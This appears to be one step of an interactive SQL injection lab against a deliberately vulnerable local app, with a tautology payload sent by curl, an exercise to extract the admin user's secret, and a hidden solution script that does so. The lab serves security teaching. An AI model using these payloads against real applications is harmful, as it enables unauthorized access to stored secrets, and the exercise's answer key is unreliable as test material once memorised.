# SQL injection

The `/sqli` route pastes the `name` parameter straight into its query. Send a
name that closes the quote and adds a condition that is always true:

`curl -sG http://127.0.0.1:5000/sqli --data-urlencode "name=x' OR '1'='1"; echo`{{exec}}

Look at the `query` field: your input became part of the SQL. The app returned
every user, secrets included.

**Your task:** save the `admin` user's secret to `/root/admin-secret.txt`.

<details><summary>Show a solution</summary>

```plain
curl -sG http://127.0.0.1:5000/sqli --data-urlencode "name=x' OR '1'='1" \
  | python3 -c 'import json,sys; print([r[3] for r in json.load(sys.stdin)["rows"] if r[1]=="admin"][0])' \
  > /root/admin-secret.txt
cat /root/admin-secret.txt
```{{exec}}

</details>
